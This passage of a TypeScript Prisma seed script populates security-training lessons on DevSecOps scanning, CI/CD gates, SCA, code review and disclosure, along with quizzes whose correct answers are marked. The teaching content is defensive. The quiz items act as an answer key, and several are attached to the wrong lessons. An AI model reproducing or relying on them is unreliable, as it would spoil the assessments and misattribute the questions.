import { PrismaClient } from '@prisma/client';

async function createQuizWithQuestions(
  prisma: PrismaClient,
  lessonId: string,
  questions: Array<{
    text: string;
    answers: Array<{ text: string; isCorrect: boolean }>;
  }>,
) {
  const quiz = await prisma.quiz.create({ data: { lessonId } });
  for (const q of questions) {
    await prisma.question.create({
      data: {
        quizId: quiz.id,
        text: q.text,
        answers: {
          create: q.answers.map((a) => ({ text: a.text, isCorrect: a.isCorrect })),
        },
      },
    });
  }
  return quiz;
}

export async function seedEnrichCourses(prisma: PrismaClient) {
  const sdlCourse = await prisma.course.findFirst({ where: { title: 'Product Security Architecture & SDL' } });
  const webCourse = await prisma.course.findFirst({ where: { title: 'Advanced Web Vulnerabilities' } });
  const linuxCourse = await prisma.course.findFirst({ where: { title: 'Linux Fundamentals — From Zero to Command Line Hero' } });
  const webServerCourse = await prisma.course.findFirst({ where: { title: 'Web Server Administration' } });
  const netCourse = await prisma.course.findFirst({ where: { title: 'Networking & Security' } });
  const kernelCourse = await prisma.course.findFirst({ where: { title: 'Linux Kernel & System Internals' } });
  const devopsCourse = await prisma.course.findFirst({ where: { title: 'Containerization & DevOps' } });

  if (sdlCourse) await prisma.course.update({ where: { id: sdlCourse.id }, data: { estimatedHours: 14 } });
  if (webCourse) await prisma.course.update({ where: { id: webCourse.id }, data: { estimatedHours: 16 } });
  if (linuxCourse) await prisma.course.update({ where: { id: linuxCourse.id }, data: { estimatedHours: 20 } });
  if (webServerCourse) await prisma.course.update({ where: { id: webServerCourse.id }, data: { estimatedHours: 14 } });
  if (netCourse) await prisma.course.update({ where: { id: netCourse.id }, data: { estimatedHours: 22 } });
  if (kernelCourse) await prisma.course.update({ where: { id: kernelCourse.id }, data: { estimatedHours: 18 } });
  if (devopsCourse) await prisma.course.update({ where: { id: devopsCourse.id }, data: { estimatedHours: 24 } });

  // ====================================================================
  // 1. Product Security Architecture & SDL
  // ====================================================================
  if (sdlCourse) {
    const sdlSec2 = await prisma.section.create({
      data: { courseId: sdlCourse.id, title: "2. DevSecOps & Automation", order: 2 },
    });

    const sdlL1 = await prisma.lesson.create({
      data: {
        sectionId: sdlSec2.id,
        title: "SAST, DAST & SCA Integration",
        order: 1,
        content: `# SAST, DAST & SCA Integration

### Learning Objectives
- Understand the differences between Static Application Security Testing (SAST), Dynamic Application Security Testing (DAST), and Software Composition Analysis (SCA)
- Configure SAST tools such as Semgrep and SonarQube for automated code analysis in CI/CD pipelines
- Set up DAST tools like OWASP ZAP and Burp Suite Enterprise for runtime vulnerability scanning
- Integrate SCA tools including Snyk and Dependabot to detect vulnerable dependencies
- Design a unified security testing strategy that balances coverage, speed, and developer friction

### What Are SAST, DAST, and SCA?

Modern application security relies on three complementary testing methodologies, each targeting a different layer of the software stack.

**Static Application Security Testing (SAST)** analyzes source code, bytecode, or binary without executing the application. SAST tools parse the abstract syntax tree of your codebase and apply pattern-matching rules to detect insecure coding patterns. Common findings include SQL injection in raw query strings, cross-site scripting (XSS) in template rendering, hardcoded credentials, and insecure cryptographic configurations.

SAST excels at catching vulnerabilities early in the development cycle, well before code reaches staging environments. However, it suffers from higher false-positive rates because it cannot observe actual data flow at runtime. Tools like Semgrep use custom rules written in a domain-specific language, while SonarQube provides broader code quality and security rule sets across 30+ languages.

**Dynamic Application Security Testing (DAST)** tests the running application from the outside-in, simulating real attacker behavior. DAST tools send crafted HTTP requests, fuzz parameters, and analyze responses to identify vulnerabilities such as reflected XSS, server misconfigurations, information leakage, and authentication bypasses.

Unlike SAST, DAST has very low false-positive rates because it confirms exploitability. The trade-off is that DAST requires a deployed, running application, so vulnerabilities are found later in the cycle. OWASP ZAP (Zed Attack Proxy) is the leading open-source DAST tool, while Burp Suite Enterprise provides scalable, automated scanning for enterprise environments.

**Software Composition Analysis (SCA)** scans third-party dependencies for known CVEs and license compliance issues. Modern applications contain 70-90% open-source code, making SCA critical. Snyk, Dependabot, and OWASP Dependency-Check maintain databases of vulnerability advisories and map them to your specific dependency versions.

### Integrating SAST into Your Pipeline

A production SAST integration follows these steps:

1. **Rule Configuration**: Start with the default rule set and progressively customize. Disable rules that produce excessive false positives for your stack. Semgrep allows per-file overrides using inline comments.
2. **Baseline Establishment**: Run SAST on your existing codebase and triage all findings. Create a baseline file that excludes known issues, so the CI gate only fails on new findings.
3. **CI Gate Setup**: Configure your pipeline to run SAST on pull requests. Use GitHub Actions, GitLab CI, or Jenkins. The tool should produce machine-readable output (SARIF format) for integration with code review tools.
4. **Developer Feedback Loop**: Surface SAST findings directly in pull request reviews using GitHub Code Scanning or GitLab SAST dashboards. Include fix recommendations and rule documentation links.

### DAST Configuration and Automation

DAST requires a running instance of your application. In CI, this typically means spinning up a containerized version of your app:

1. Build the application container
2. Start it alongside any required dependencies (database, cache)
3. Run OWASP ZAP against the target URL with a preconfigured scan policy
4. Parse the ZAP report for high and critical findings
5. Tear down the environment

For production-grade DAST, consider continuous scanning in staging environments. OWASP ZAP supports scheduled scans via its API, and Burp Suite Enterprise integrates natively with Jenkins and Azure DevOps.

### SCA in Practice

SCA tools integrate at multiple points:

- **IDE Plugin**: Real-time feedback as developers add dependencies (Snyk for VS Code, IntelliJ)
- **CI Pipeline**: Fail builds on high-severity dependency vulnerabilities
- **Pull Request Check**: Automatic dependency review (GitHub Dependabot)
- **Continuous Monitoring**: Daily scans of your dependency tree for newly disclosed CVEs

The key challenge is managing vulnerability fatigue. Not every CVE warrants immediate action. Use severity scoring (CVSS), reachability analysis (is the vulnerable function actually called?), and exploitability ratings to prioritize fixes.

### Hands-On Practice

1. **Semgrep Setup**: Install Semgrep locally and run it against a sample vulnerable Node.js application. Customize the rule set to add a custom rule that detects API keys hardcoded in source files. Integrate it into a GitHub Actions workflow that runs on pull requests.
2. **OWASP ZAP Automation**: Deploy a test web application using Docker. Write a ZAP automation script that performs an active scan against the application and generates a SARIF report. Parse the report to extract only critical findings.
3. **Snyk Integration**: Connect a GitHub repository to Snyk. Review the dependency tree and identify three transitive dependencies with known vulnerabilities. Create a pull request that upgrades the parent dependency to resolve the issues.

### Key Takeaways
- SAST finds code-level vulnerabilities early but has higher false positives; DAST confirms exploitability but requires a running app; SCA catches vulnerable dependencies
- Integrate all three at different stages of your pipeline for defense in depth
- Use SARIF as a standard format to unify security findings across tools
- Triage findings by severity, reachability, and exploitability to avoid alert fatigue
- Automate scanning on every pull request and continuously in staging environments

### References & Further Reading
- OWASP DevSecOps Guideline: https://owasp.org/www-project-devsecops-guideline/
- Semgrep Documentation: https://semgrep.dev/docs/
- OWASP ZAP User Guide: https://www.zaproxy.org/docs/`,
      },
    });

    await createQuizWithQuestions(prisma, sdlL1.id, [
      {
        text: "Which testing methodology analyzes source code without executing the application?",
        answers: [
          { text: "DAST", isCorrect: false },
          { text: "SAST", isCorrect: true },
          { text: "SCA", isCorrect: false },
          { text: "IAST", isCorrect: false },
        ],
      },
      {
        text: "What is the primary advantage of DAST over SAST?",
        answers: [
          { text: "DAST runs faster in CI pipelines", isCorrect: false },
          { text: "DAST analyzes source code patterns", isCorrect: false },
          { text: "DAST confirms exploitability with low false positives", isCorrect: true },
          { text: "DAST does not require a running application", isCorrect: false },
        ],
      },
      {
        text: "Which format is the industry standard for sharing security scan results across tools?",
        answers: [
          { text: "JSON", isCorrect: false },
          { text: "XML", isCorrect: false },
          { text: "SARIF", isCorrect: true },
          { text: "CSV", isCorrect: false },
        ],
      },
      {
        text: "What percentage of a typical modern application consists of open-source code?",
        answers: [
          { text: "10-20%", isCorrect: false },
          { text: "30-40%", isCorrect: false },
          { text: "50-60%", isCorrect: false },
          { text: "70-90%", isCorrect: true },
        ],
      },
    ]);

    const sdlL2 = await prisma.lesson.create({
      data: {
        sectionId: sdlSec2.id,
        title: "CI/CD Security Gates",
        order: 2,
        content: `# CI/CD Security Gates

### Learning Objectives
- Design and implement security gates at each stage of a CI/CD pipeline
- Configure pre-commit hooks, build-time checks, and deployment approvals
- Understand the trade-offs between pipeline speed and security coverage
- Implement secrets detection to prevent credential leakage in source code
- Set up policy-as-code frameworks like Open Policy Agent for deployment validation

### The Pipeline as a Security Boundary

Every stage of your CI/CD pipeline is a potential security boundary. A security gate is a checkpoint that evaluates defined criteria before allowing the pipeline to proceed. Without gates, vulnerable code, exposed secrets, or misconfigured infrastructure can flow directly to production.

The principle is analogous to airport security: each checkpoint validates a different aspect of safety, and failing any single checkpoint prevents boarding. In a CI/CD pipeline, gates should cover:

1. **Pre-commit**: Local developer checks for secrets, formatting, and linting
2. **Build**: Dependency scanning, SAST analysis, container image scanning
3. **Test**: DAST scanning, integration tests, security unit tests
4. **Deploy**: Infrastructure validation, policy compliance, approval workflows

### Pre-Commit Security Gates

The earliest possible intervention is at the developer's workstation. Pre-commit hooks execute before code enters version control:

- **Secrets Detection**: Tools like git-secrets, truffleHog, or detect-secrets scan staged files for patterns matching API keys, private keys, database credentials, and tokens. Configure allow-lists for known false positives such as example tokens in documentation.
- **Linting and Formatting**: ESLint security plugins catch common anti-patterns like eval(), innerHTML assignments, and missing input validation. Consistent code style reduces the attack surface caused by careless coding.
- **Commit Message Validation**: Enforce conventional commit formats that include security-relevant prefixes when applicable.

Pre-commit hooks must be enforced at the server level using protected branches and branch protection rules. Client-side hooks can be bypassed, so they serve as developer convenience rather than a hard security boundary.

### Build-Time Security Gates

When code is pushed to a remote repository, the CI server takes over. Build-time gates include:

- **Dependency Resolution Lock**: Verify that lock files (package-lock.json, yarn.lock, Pipfile.lock) have not been tampered with. Use npm ci instead of npm install to ensure deterministic installs.
- **Container Image Scanning**: Before pushing Docker images to your registry, scan them with Trivy, Grype, or Docker Scout. Block images with critical OS-level or library vulnerabilities.
- **SBOM Generation**: Generate a Software Bill of Materials using Syft or CycloneDX to maintain an inventory of all components, versions, and licenses in your build artifact.
- **License Compliance**: Configure license allow-lists (MIT, Apache-2.0, BSD) and block builds that introduce copyleft licenses (GPL, AGPL) in proprietary products.

### Deployment Security Gates

The final gate before production deployment should validate infrastructure and configuration:

- **Infrastructure as Code Scanning**: Use Checkov or tfsec to scan Terraform, CloudFormation, or Kubernetes manifests for misconfigurations such as publicly exposed databases, overly permissive IAM roles, or missing encryption settings.
- **Policy as Code**: Open Policy Agent (OPA) and Gatekeeper allow you to define deployment policies in a declarative language. For example, a policy might require that all container images come from approved registries and that resource limits are defined.
- **Manual Approval for Production**: Require at least one human approval for production deployments. This creates an audit trail and provides a final opportunity to catch issues that automated checks miss.

### Secrets Detection in CI

Secrets leakage is one of the most common and damaging security incidents. Integrate secrets scanning at multiple pipeline stages:

1. **Git History Scanning**: Scan the entire commit history, not just the current diff, using TruffleHog or GitLeaks
2. **Environment Variable Auditing**: Ensure no secrets are logged in CI output or stored in plaintext artifacts
3. **Runtime Secrets Validation**: Use tools like Vault or AWS Secrets Manager and verify that applications do not log sensitive values

### Hands-On Practice

1. **Pre-commit Pipeline**: Install detect-secrets and configure a .pre-commit-config.yaml that scans for AWS access keys and GitHub tokens. Add a .secrets.baseline file and test it against a sample repository containing intentional dummy secrets.
2. **CI Security Gate**: Create a GitHub Actions workflow that runs Trivy container scanning after building a Docker image. Configure the workflow to fail if any critical vulnerabilities are found and upload the scan results as a workflow artifact.
3. **Policy as Code**: Write an OPA/Rego policy that denies Kubernetes deployments where containers run as root or lack resource limits. Test the policy against sample manifests using the opa test command.

### Key Takeaways
- Security gates should exist at every stage of the pipeline: pre-commit, build, test, and deploy
- Pre-commit hooks are convenient but can be bypassed; enforce security at the server level
- Integrate secrets detection early and scan entire git history, not just current changes
- Policy as code frameworks like OPA provide declarative, auditable deployment policies
- Balance security thoroughness with pipeline speed; prioritize gates based on risk

### References & Further Reading
- OWASP CI/CD Security Top 10: https://owasp.org/www-project-ci-cd-security-top-10/
- Open Policy Agent Documentation: https://www.openpolicyagent.org/docs/
- Trivy Scanner: https://trivy.dev/`,
      },
    });

    await createQuizWithQuestions(prisma, sdlL2.id, [
      {
        text: "At which pipeline stage should secrets detection ideally first run?",
        answers: [
          { text: "Deployment stage", isCorrect: false },
          { text: "Pre-commit hooks", isCorrect: true },
          { text: "After merge to main", isCorrect: false },
          { text: "Production monitoring", isCorrect: false },
        ],
      },
      {
        text: "Why are client-side pre-commit hooks insufficient as a sole security boundary?",
        answers: [
          { text: "They slow down the developer workflow", isCorrect: false },
          { text: "They can be bypassed by the developer", isCorrect: true },
          { text: "They cannot detect secrets", isCorrect: false },
          { text: "They require Docker to be installed", isCorrect: false },
        ],
      },
      {
        text: "Which tool provides policy-as-code capabilities for Kubernetes deployments?",
        answers: [
          { text: "Webpack", isCorrect: false },
          { text: "Babel", isCorrect: false },
          { text: "Open Policy Agent (OPA)", isCorrect: true },
          { text: "ESLint", isCorrect: false },
        ],
      },
      {
        text: "What command should be used instead of npm install in CI for deterministic builds?",
        answers: [
          { text: "npm fetch", isCorrect: false },
          { text: "npm ci", isCorrect: true },
          { text: "npm run install", isCorrect: false },
          { text: "npm update", isCorrect: false },
        ],
      },
      {
        text: "Which tool generates a Software Bill of Materials in CycloneDX format?",
        answers: [
          { text: "ESLint", isCorrect: false },
          { text: "Trivy", isCorrect: false },
          { text: "Syft", isCorrect: true },
          { text: "Prettier", isCorrect: false },
        ],
      },
    ]);

    const sdlL3 = await prisma.lesson.create({
      data: {
        sectionId: sdlSec2.id,
        title: "Software Composition Analysis",
        order: 3,
        content: `# Software Composition Analysis

### Learning Objectives
- Explain why SCA is essential given that modern apps are 70-90% open-source code
- Use tools like Snyk, OWASP Dependency-Check, and GitHub Dependabot to detect vulnerable dependencies
- Perform reachability analysis to determine if a vulnerable function is actually used
- Manage dependency updates and vulnerability remediation workflows
- Understand transitive dependency risks and lock file integrity

### The Open-Source Supply Chain Problem

Modern software is built on layers of open-source libraries. A typical Node.js application may have over 1,000 transitive dependencies. Each of these dependencies can contain known vulnerabilities, abandoned maintainers, or malicious code injected through supply chain attacks.

The 2021 Log4Shell vulnerability demonstrated how a single library used by millions of applications could become a critical global security event. The 2020 SolarWinds attack showed that even trusted software vendors can be compromised. SCA is your defense against these risks.

### How SCA Tools Work

SCA tools maintain databases mapping software packages to known vulnerabilities:

1. **Dependency Enumeration**: The tool reads your manifest files (package.json, requirements.txt, go.mod, pom.xml) and resolves the complete dependency tree including transitive dependencies.
2. **Version Matching**: Each identified package version is cross-referenced against vulnerability databases such as the National Vulnerability Database (NVD), GitHub Advisory Database, and vendor-specific advisories.
3. **Severity Assessment**: Matched vulnerabilities are scored using CVSS (Common Vulnerability Scoring System) and enriched with additional context such as EPSS (Exploit Prediction Scoring System) scores.
4. **Reachability Analysis**: Advanced tools like Snyk and Endor Labs determine whether your code actually calls the vulnerable function, reducing false positives significantly.

### Configuring SCA in Your Project

For **npm** projects, enable npm audit in your CI pipeline: run \`npm audit --audit-level=high\` to fail on high-severity findings. Use \`npm audit fix\` for automated remediation where compatible semver updates exist.

For **Python** projects, use safety or pip-audit: \`pip-audit\` scans installed packages against the OSV database.

For **Go** projects, use govulncheck: govulncheck analyzes actual function calls to determine vulnerability reachability and produces minimal false positives.

### Dependency Update Strategies

SCA is not just about detection; it requires a systematic remediation workflow:

- **Automated Patch Updates**: Configure Dependabot or Renovate to create pull requests automatically for patch-level dependency updates. These typically contain security fixes and are low risk.
- **Minor Version Updates**: Review changelogs and run your test suite before merging. Minor versions may introduce new features or deprecations.
- **Major Version Updates**: Plan major upgrades as dedicated work items. They may require code changes and should be tested thoroughly.
- **Dependency Pinning vs Ranges**: Use exact version pinning in production with lock files. Allow ranges only in development environments.

### Transitive Dependency Risks

The most dangerous vulnerabilities often lurk deep in the dependency tree. A library you directly depend on may pull in another library that contains the vulnerability. SCA tools must resolve the full transitive tree to catch these.

Key practices:
- Regularly run \`npm ls\` or \`pip freeze\` to audit the complete dependency tree
- Use \`npm dedupe\` or equivalent to reduce duplicate dependencies
- Review the dependency tree of any new library before adding it to your project

### SBOM and Compliance

Regulatory frameworks increasingly require Software Bills of Materials. The US Executive Order on Improving Cybersecurity (2021) mandated SBOMs for software sold to the federal government.

Generate SBOMs in CycloneDX or SPDX format:
- CycloneDX is optimized for security use cases and integrates well with vulnerability scanners
- SPDX is an ISO standard focused on license compliance and provenance tracking
- Store SBOMs as build artifacts and publish them alongside your releases

### Hands-On Practice

1. **Snyk Project Setup**: Connect a sample Node.js project to Snyk. Identify three vulnerable transitive dependencies. Create a PR that upgrades the parent dependency to resolve the vulnerabilities.
2. **Reachability Analysis**: Use govulncheck on a Go project. Identify a vulnerability that govulncheck reports as not reachable and remove the code path that triggers it.
3. **SBOM Generation**: Install Syft and generate a CycloneDX SBOM for a Docker container image. Upload the SBOM to a Dependency-Track instance and verify component versions and licenses.

### Key Takeaways
- Modern applications are predominantly open-source code; SCA is not optional
- Reachability analysis dramatically reduces false positives by confirming whether vulnerable code is actually called
- Automate dependency updates for patch versions; manually review minor and major upgrades
- Generate and store SBOMs for regulatory compliance and incident response
- Transitive dependencies are the most common source of hidden vulnerabilities

### References & Further Reading
- CycloneDX SBOM Specification: https://cyclonedx.org/
- Open Source Vulnerabilities (OSV) Database: https://osv.dev/
- Snyk Open Source Documentation: https://docs.snyk.io/products/snyk-open-source`,
      },
    });

    await createQuizWithQuestions(prisma, sdlL3.id, [
      {
        text: "What makes transitive dependencies particularly dangerous in SCA?",
        answers: [
          { text: "They are always MIT licensed", isCorrect: false },
          { text: "They are hidden deep in the dependency tree and often overlooked", isCorrect: true },
          { text: "They never contain vulnerabilities", isCorrect: false },
          { text: "They are always the latest version", isCorrect: false },
        ],
      },
      {
        text: "Which tool provides reachability analysis for Go vulnerability scanning?",
        answers: [
          { text: "npm audit", isCorrect: false },
          { text: "govulncheck", isCorrect: true },
          { text: "pip-audit", isCorrect: false },
          { text: "Snyk CLI", isCorrect: false },
        ],
      },
      {
        text: "What is an SBOM primarily used for?",
        answers: [
          { text: "Compiling source code", isCorrect: false },
          { text: "Running unit tests", isCorrect: false },
          { text: "Maintaining an inventory of software components, versions, and licenses", isCorrect: true },
          { text: "Deploying containers to production", isCorrect: false },
        ],
      },
      {
        text: "Which dependency update strategy should be automated for all patch-level releases?",
        answers: [
          { text: "Manual review and approval for each patch", isCorrect: false },
          { text: "Automated pull requests via Dependabot or Renovate", isCorrect: true },
          { text: "No updates should be automated", isCorrect: false },
          { text: "Only update on major security incidents", isCorrect: false },
        ],
      },
    ]);

    const sdlSec3 = await prisma.section.create({
      data: { courseId: sdlCourse.id, title: "3. Secure Code Review & Incident Response", order: 3 },
    });

    const sdlL4 = await prisma.lesson.create({
      data: {
        sectionId: sdlSec3.id,
        title: "Secure Code Review Methodology",
        order: 1,
        content: `# Secure Code Review Methodology

### Learning Objectives
- Apply a structured methodology for performing manual and automated secure code reviews
- Identify the top vulnerability classes in code: injection, authentication flaws, access control issues, and cryptographic misuse
- Use code review checklists and threat models to guide the review process
- Understand the limitations of automated tools and when manual review is necessary
- Document and communicate findings effectively to development teams

### Why Automated Tools Are Not Enough

Static analysis tools find approximately 30-50% of security vulnerabilities in code. The remaining issues require human judgment to identify:

- Business logic flaws that violate security invariants
- Authentication and authorization bypasses in complex workflows
- Race conditions and time-of-check-to-time-of-use (TOCTOU) bugs
- Improper error handling that leaks sensitive information
- Cryptographic misconfigurations that weaken encryption

A secure code review combines automated scanning with targeted manual analysis to find vulnerabilities that tools miss.

### The Review Process

**Step 1: Scope Definition**

Before reviewing code, define the scope:
- Identify high-risk components: authentication modules, payment processing, API endpoints, data access layers
- Use threat model outputs to prioritize attack surfaces
- Determine the review boundaries: which files, modules, and endpoints to examine

**Step 2: Automated Pre-Scan**

Run SAST tools first to identify obvious vulnerabilities. Triage the results and remove false positives. This creates a focused list of areas requiring deeper manual investigation.

**Step 3: Manual Code Review**

Walk through the code systematically, focusing on:

1. **Data Flow Analysis**: Trace untrusted input from entry points (HTTP requests, CLI arguments, message queues) through validation, transformation, and storage. Look for places where input bypasses validation or is used in unsafe operations.
2. **Authentication Logic**: Review session management, token validation, password handling, and multi-factor authentication flows. Check for credential stuffing protection, rate limiting, and account lockout mechanisms.
3. **Authorization Checks**: Verify that every sensitive operation enforces access control. Common flaws include missing authorization on API endpoints, horizontal privilege escalation (accessing another user's data), and vertical privilege escalation (regular user accessing admin functions).
4. **Cryptographic Usage**: Check for hardcoded keys, weak algorithms (MD5, SHA1 for security), improper IV handling, and missing encryption for sensitive data at rest.

**Step 4: Findings Documentation**

Document each finding with:
- Vulnerability title and CWE identifier
- Affected file and line numbers
- Proof of concept showing how the vulnerability could be exploited
- Recommended remediation with code examples
- Severity rating (Critical, High, Medium, Low)

### Common Vulnerability Patterns

**Injection**: Look for string concatenation or template literals used in SQL queries, shell commands, or LDAP queries. Even with ORMs, dynamic query construction can introduce injection.

**Broken Access Control**: Check every route handler and API endpoint for authorization middleware. Verify that IDOR (Insecure Direct Object References) is prevented by validating that the authenticated user owns the requested resource.

**Cryptographic Misuse**: Never use Math.random() for security purposes, never store passwords in plaintext, never use ECB mode for block ciphers, and never hardcode encryption keys.

**Information Disclosure**: Review error handling to ensure stack traces, database queries, and internal paths are not exposed to users. Check that debug modes are disabled in production.

### Communicating Findings

Security findings must be actionable for developers:
- Avoid blame-oriented language; focus on the vulnerability, not the developer
- Provide concrete fix examples in the same language as the reviewed code
- Group related findings to avoid overwhelming developers with individual tickets
- Prioritize findings by exploitability and business impact
- Follow up to verify that fixes are correct and complete

### Hands-On Practice

1. **Code Review Walkthrough**: Review a sample vulnerable Node.js application (such as OWASP Juice Shop) and identify five different vulnerability classes. Document each finding with CWE numbers and remediation steps.
2. **Checklist Creation**: Create a secure code review checklist tailored to your organization's technology stack. Include at least 20 items covering input validation, authentication, authorization, cryptography, and error handling.
3. **Tool Comparison**: Run both Semgrep and SonarQube against the same codebase. Compare the findings to identify vulnerabilities that one tool catches but the other misses.

### Key Takeaways
- Automated tools catch 30-50% of vulnerabilities; manual review is essential for logic flaws and complex attack patterns
- Follow a structured process: scope definition, automated pre-scan, manual review, findings documentation
- Trace data flow from untrusted input to sensitive operations to find injection and logic vulnerabilities
- Document findings with CWE identifiers, proof of concept, and concrete remediation guidance
- Communicate findings constructively and follow up to verify fixes

### References & Further Reading
- OWASP Code Review Guide: https://owasp.org/www-project-code-review-guide/
- CWE/SANS Top 25 Most Dangerous Software Weaknesses: https://cwe.mitre.org/top25/
- Microsoft Secure Coding Guidelines: https://learn.microsoft.com/en-us/previous-versions/msp-n-p/ff648641`,
      },
    });

    await createQuizWithQuestions(prisma, sdlL4.id, [
      {
        text: "Approximately what percentage of security vulnerabilities can automated SAST tools detect?",
        answers: [
          { text: "10-20%", isCorrect: false },
          { text: "30-50%", isCorrect: true },
          { text: "70-80%", isCorrect: false },
          { text: "90-100%", isCorrect: false },
        ],
      },
      {
        text: "What does IDOR stand for in the context of access control vulnerabilities?",
        answers: [
          { text: "Internal Denial of Resource", isCorrect: false },
          { text: "Insecure Direct Object Reference", isCorrect: true },
          { text: "Indirect Domain Object Retrieval", isCorrect: false },
          { text: "Invalid Data Object Request", isCorrect: false },
        ],
      },
      {
        text: "Which technique is used to identify the underlying systemic cause in a post-mortem?",
        answers: [
          { text: "Root Cause Analysis with the 5 Whys", isCorrect: true },
          { text: "SWOT Analysis", isCorrect: false },
          { text: "Agile Sprint Retrospective", isCorrect: false },
          { text: "Six Sigma DMAIC", isCorrect: false },
        ],
      },
      {
        text: "What is the standard coordinated disclosure timeline used by Google Project Zero?",
        answers: [
          { text: "30 days", isCorrect: false },
          { text: "60 days", isCorrect: false },
          { text: "90 days", isCorrect: true },
          { text: "120 days", isCorrect: false },
        ],
      },
    ]);

    const sdlL5 = await prisma.lesson.create({
      data: {
        sectionId: sdlSec3.id,
        title: "Vulnerability Disclosure & Post-Mortem",
        order: 2,
        content: `# Vulnerability Disclosure & Post-Mortem

### Learning Objectives
- Understand responsible vulnerability disclosure processes including coordinated disclosure timelines
- Draft a vulnerability disclosure policy for your organization
- Conduct blameless post-mortem analyses after security incidents
- Create actionable post-mortem reports that prevent recurrence
- Build a culture of transparency and continuous improvement in security

### Responsible Disclosure

Responsible vulnerability disclosure ensures that security researchers and vendors work together to protect users before public disclosure. The standard timeline is:

1. **Discovery**: A researcher finds a vulnerability in a product or service
2. **Private Reporting**: The researcher reports the vulnerability to the vendor through a secure channel (security@ email, bug bounty platform, PGP-encrypted email)
3. **Acknowledgment**: The vendor acknowledges receipt within 24-48 hours
4. **Remediation Window**: The vendor has 90 days to develop and deploy a fix (this is Google Project Zero's standard timeline)
5. **Coordinated Disclosure**: After the remediation window, or when a fix is available (whichever comes first), the vulnerability details are published

If the vendor is unresponsive or refuses to fix the issue, the researcher may proceed with disclosure after the timeline expires. This creates accountability on both sides.

### Building a Disclosure Policy

Your organization needs a clear vulnerability disclosure policy that external researchers can find and follow:

**Acceptable Scope**: Define which systems, applications, and APIs are in scope for testing. Explicitly exclude systems that could cause data loss or service disruption if tested.

**Safe Harbor**: Promise that researchers who follow your policy will not face legal action. This is critical for encouraging responsible reporting.

**Submission Process**: Provide a clear method for reporting vulnerabilities. Include a security contact email, a bug bounty platform link, and expected response times.

**Rewards**: If you offer bug bounties, define the reward structure based on severity. Even without monetary rewards, public recognition or swag can incentivize researchers.

### Conducting Post-Mortems

When a security incident occurs, the post-mortem process is essential for preventing recurrence. A blameless post-mortem focuses on systemic causes, not individual mistakes.

**Post-Mortem Structure:**

1. **Incident Summary**: One-paragraph description of what happened, when it was detected, and the impact
2. **Timeline**: Chronological list of events from initial trigger to resolution, with timestamps
3. **Impact Assessment**: Number of affected users, data exposed, financial impact, compliance implications
4. **Root Cause Analysis**: Use the "5 Whys" technique to identify the underlying systemic cause
5. **What Went Well**: Identify aspects of the response that worked correctly
6. **What Could Be Improved**: List specific process, tooling, or communication gaps
7. **Action Items**: Assign owners and deadlines for each improvement item
8. **Lessons Learned**: Key takeaways that should be shared broadly

### Writing Effective Post-Mortems

The most valuable post-mortems are those that lead to concrete changes:
- Assign each action item to a specific owner with a realistic deadline
- Track action items to completion; stale post-mortem actions are a common pattern
- Share post-mortems broadly within the organization to spread lessons learned
- Use post-mortem data to identify systemic patterns across incidents
- Publish sanitized summaries externally to build trust with users

### Building a Post-Incident Culture

The best security organizations treat incidents as learning opportunities:
- Blameless culture encourages honest reporting of mistakes
- Regular post-mortem reviews identify recurring themes
- Post-mortem templates ensure consistency across incidents
- Metrics track whether action items are completed on time

### Hands-On Practice

1. **Disclosure Policy Draft**: Write a vulnerability disclosure policy for a fictional SaaS company. Include scope, safe harbor statement, submission process, expected timelines, and reward tiers.
2. **Post-Mortem Exercise**: Given a scenario where a SQL injection vulnerability was discovered in production, write a complete blameless post-mortem report including timeline, impact, root cause analysis, and five concrete action items.
3. **Disclosure Timeline Simulation**: Role-play a coordinated disclosure scenario where you are the researcher who found a critical vulnerability. Draft the initial report, follow-up emails, and final disclosure timeline.

### Key Takeaways
- Follow the 90-day coordinated disclosure timeline as an industry standard
- A clear disclosure policy with safe harbor provisions encourages responsible reporting
- Blameless post-mortems focus on systemic causes, not individual mistakes
- Every post-mortem must produce actionable items with owners and deadlines
- Share lessons learned broadly to build organizational security knowledge

### References & Further Reading
- Google Project Zero Disclosure Policy: https://googleprojectzero.blogspot.com/p/disclosure-timeline.html
- CERT/CC Vulnerability Disclosure Guidelines: https://www.kb.cert.org/vuls/report/
- Google SRE Book - Postmortem Culture: https://sre.google/sre-book/postmortem-culture/`,
      },
    });

    await createQuizWithQuestions(prisma, sdlL5.id, [
      {
        text: "What is the first step in the NIST incident response lifecycle?",
        answers: [
          { text: "Detection and Analysis", isCorrect: false },
          { text: "Preparation", isCorrect: true },
          { text: "Containment", isCorrect: false },
          { text: "Post-Incident Activity", isCorrect: false },
        ],
      },
      {
        text: "Why is safe harbor important in a vulnerability disclosure policy?",
        answers: [
          { text: "It prevents researchers from being sued for following the policy", isCorrect: true },
          { text: "It guarantees monetary rewards", isCorrect: false },
          { text: "It requires immediate public disclosure", isCorrect: false },
          { text: "It allows unlimited testing time", isCorrect: false },
        ],
      },
      {
        text: "What should be preserved first during a security incident before making any changes?",
        answers: [
          { text: "Database backups", isCorrect: false },
          { text: "Application source code", isCorrect: false },
          { text: "Evidence including logs, memory dumps, and disk images", isCorrect: true },
          { text: "User session tokens", isCorrect: false },
        ],
      },
      {
        text: "Which containment strategy allows disabling vulnerable functionality without deploying new code?",
        answers: [
          { text: "Network segmentation", isCorrect: false },
          { text: "Credential rotation", isCorrect: false },
          { text: "Feature flags", isCorrect: true },
          { text: "WAF rules", isCorrect: false },
        ],
      },
      {
        text: "What is the GDPR notification requirement for data breaches?",
        answers: [
          { text: "24 hours", isCorrect: false },
          { text: "72 hours", isCorrect: true },
          { text: "7 days", isCorrect: false },
          { text: "30 days", isCorrect: false },
        ],
      },
    ]);

    const sdlL6 = await prisma.lesson.create({
      data: {
        sectionId: sdlSec3.id,
        title: "Incident Response for Developers",
        order: 3,
        content: `# Incident Response for Developers

### Learning Objectives
- Understand the NIST incident response lifecycle and how developers fit into the response process
- Implement technical controls that support incident detection and response
- Write and execute incident response runbooks for common security scenarios
- Understand the developer's role during an active security incident
- Practice evidence preservation and forensic data collection techniques

### The Developer's Role in Incident Response

Incident response is not solely the responsibility of the security operations team. Developers play a critical role because they understand the application architecture, data flows, and codebase. During an incident, developers are responsible for:

- Providing technical context to the incident response team
- Implementing emergency code changes to contain the incident
- Collecting forensic evidence from application logs and databases
- Verifying that remediation fixes are complete and correct
- Participating in post-incident hardening activities

### NIST Incident Response Lifecycle

The NIST framework defines four phases:

**Preparation**: Build the capabilities needed before an incident occurs. This includes deploying logging infrastructure, creating runbooks, setting up communication channels, and conducting tabletop exercises.

